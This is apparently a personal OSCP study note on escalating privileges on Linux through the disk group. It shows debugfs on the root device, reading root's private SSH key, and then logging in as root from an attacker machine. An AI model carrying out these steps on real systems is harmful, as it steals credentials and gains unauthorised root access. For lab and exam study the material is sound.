Disk Group Priv Esc

```
id
```

Upon seeing that we belong to disk group
```powershell
sysadmin@fanatastic:/tmp$ id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin),6(disk)
```

Find where "/" is mounted
```
df -h
```

Result
```powershell
Filesystem      Size  Used Avail Use% Mounted on
udev            445M     0  445M   0% /dev
tmpfs            98M  1.2M   97M   2% /run
/dev/sda2       9.8G  6.4G  2.9G  69% /
tmpfs           489M     0  489M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           489M     0  489M   0% /sys/fs/cgroup
/dev/loop1       56M   56M     0 100% /snap/core18/2284
/dev/loop2       62M   62M     0 100% /snap/core20/1328
/dev/loop3       56M   56M     0 100% /snap/core18/2128
/dev/loop0       68M   68M     0 100% /snap/lxd/21835
/dev/loop5       44M   44M     0 100% /snap/snapd/14549
/dev/loop6       71M   71M     0 100% /snap/lxd/21029
/dev/loop4       33M   33M     0 100% /snap/snapd/12883
tmpfs            98M     0   98M   0% /run/user/1001
```

We can use /dev/sda2
```
debugfs /dev/sda2
```

We should be in as root
```
cat /root/.ssh/id_rsa
```

On KALI ATTACKER, Paste the SSH Key
```
gedit id_rsa
```

Login as root
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `chmod 600 id_rsa && ssh root@${ip} -i id_rsa`;

dv.paragraph("```bash\n" + command + "\n```");
```
